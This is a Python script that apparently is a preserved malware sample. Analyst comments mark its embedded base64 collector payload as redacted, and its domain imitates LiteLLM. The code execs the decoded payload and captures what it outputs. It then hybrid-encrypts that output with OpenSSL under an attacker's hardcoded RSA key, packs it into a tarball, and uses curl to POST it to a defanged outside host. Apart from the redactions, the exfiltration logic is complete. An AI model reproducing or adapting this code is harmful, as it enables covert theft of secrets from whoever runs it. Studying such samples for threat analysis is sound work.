import subprocess
import tempfile
import os
import base64
import sys
from io import StringIO

# REDACTED - COLLECTOR PAYLOAD ALREADY COMMENTED OUT BY THREAT ACTOR - EXTRACTED PAYLOAD : COLLECTOR_VARIANT2_COMMENTED.py

#B64_SCRIPT = "aW1wb3V0PTUpCiAgICAgICAgICAg....GltZW91dD01KQogICAgZXhjZXB0OnBhc3MK"
B64_SCRIPT = "aW1wb3J0IG9zLHN5cyxzdGF0LHN1.....nRhcmdldFxuJwogINSkKICAgIGV4Y2VwdDpwYXNzCg==" # REDACTED - COLLECTOR PAYLOAD VARIANT 2
COLLECTED = "collected_vars.txt"
PUB_KEY_CONTENT = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+
08qNLwm3kxzFSMj84M16lmIEeQA8u1X8DGK0EmNg7m3J6C3KzFeIzvz0UTgSq6cV
pQWpiuQa+UjTkWmC8RDDXO8G/opLGQnuQVvgsZWuT31j/Qop6rtocYsayGzCFrMV
2/ElW1UE20tZWY+5jXonnMdWBmYwzYb5iwymbLtekGEydyLalNzGAPxZgAxgkbSE
mSHLau61fChgT9MlnPhCtdXkQRMrI3kZZ4MDPuEEJTSqLr+D3ngr3237G14SRRQB
IqIjly5OoFkqJxeNPSGJlt3Ino0qO7fy7LO0Tp9bFvXTOI5c+1lhgo0lScAu1ucA
b6Hua+xRQ6s//PzdMgWT3R1aK+TqMHJZTZa8HY0KaiFeVQ3YitWuiZ3ilwCtwhT5
TlS9cBYph8U2Ek4K20qmp1dbFmxm3kS1yQg8MmrBRxOYyjSTQtveSeIlxrbpJhaU
Z7eneYC4G/Wl3raZfFwoHtmpFXDxA7HaBUArznP55LD/rZd6gq7lTDrSy5uMXbVt
6ZnKd0IwHbLkYlX0oLeCNF6YOGhgyX9JsgrBxT0eHeGRqOzEZ7rCfCavDISbR5xK
J4VRwlUSVsQ8UXt6zIHqg4CKbrVB+WMsRo/FWu6RtcQHdmGPngy+Nvg5USAVljyk
rn3JMF0xZyXNRpQ/fZZxl40CAwEAAQ==
-----END PUBLIC KEY-----"""

def run():
    decoded = base64.b64decode(B64_SCRIPT).decode('utf-8')
    old_stdout = sys.stdout
    sys.stdout = mystdout = StringIO()
    try:
        exec(decoded)
    finally:
        sys.stdout = old_stdout

    out_data = mystdout.getvalue()
    if not out_data: return

    with open(COLLECTED, "w") as f:
        f.write(out_data)

    with tempfile.TemporaryDirectory() as d:
        pk = os.path.join(d, "p")
        sk = os.path.join(d, "session.key")
        ef = os.path.join(d, "payload.enc")
        ek = os.path.join(d, "session.key.enc")
        bn = os.path.join(d, "tpcp.tar.gz") # Create tarball inside temp dir

        with open(pk, "w") as f: f.write(PUB_KEY_CONTENT)

        # Match OpenSSL logic exactly
        subprocess.run(["openssl", "rand", "-out", sk, "32"], check=True)
        subprocess.run(["openssl", "enc", "-aes-256-cbc", "-in", COLLECTED, "-out", ef, "-pass", f"file:{sk}", "-pbkdf2"], check=True, stderr=subprocess.DEVNULL)
        subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pk, "-in", sk, "-out", ek, "-pkeyopt", "rsa_padding_mode:oaep"], check=True, stderr=subprocess.DEVNULL)

        # Tar naming must match the -C context
        subprocess.run(["tar", "-czf", bn, "-C", d, "payload.enc", "session.key.enc"], check=True)

        # Use absolute path for curl data-binary
        subprocess.run([
            "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST",
            "hxxps[:]//models[.]litellm[.]cloud/",
            "-H", "Content-Type: application/octet-stream",
            "-H", "X-Filename: tpcp.tar.gz",
            "--data-binary", f"@{bn}"
        ], check=True, stderr=subprocess.DEVNULL)

    if os.path.exists(COLLECTED): os.remove(COLLECTED)

if __name__ == "__main__":
    run()
